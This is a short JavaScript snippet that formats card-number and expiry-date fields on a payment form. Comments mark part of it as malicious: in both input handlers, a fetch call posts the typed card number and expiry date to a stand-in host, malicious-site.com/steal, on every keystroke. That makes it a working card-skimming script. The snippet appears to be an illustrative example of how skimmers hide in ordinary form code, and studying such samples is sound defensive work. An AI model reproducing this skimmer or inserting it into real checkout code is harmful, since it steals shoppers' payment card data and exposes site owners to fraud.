// Legitimate masking code for card number
document.getElementById('cardNumber').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\s/g, ''); // Remove existing spaces
    value = value.replace(/\D/g, ''); // Remove non-digits
    value = value.replace(/(\d{4})/g, '$1 ').trim(); // Add space every 4 digits
    e.target.value = value;

    // Malicious code: send card number to external server
    fetch('https://malicious-site.com/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardNumber: value })
    });
});

// Legitimate masking code for expiry date
document.getElementById('expiryDate').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4); // Add slash after MM
    }
    e.target.value = value;

    // Malicious code: send expiry date to external server
    fetch('https://malicious-site.com/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ expiryDate: value })
    });
});
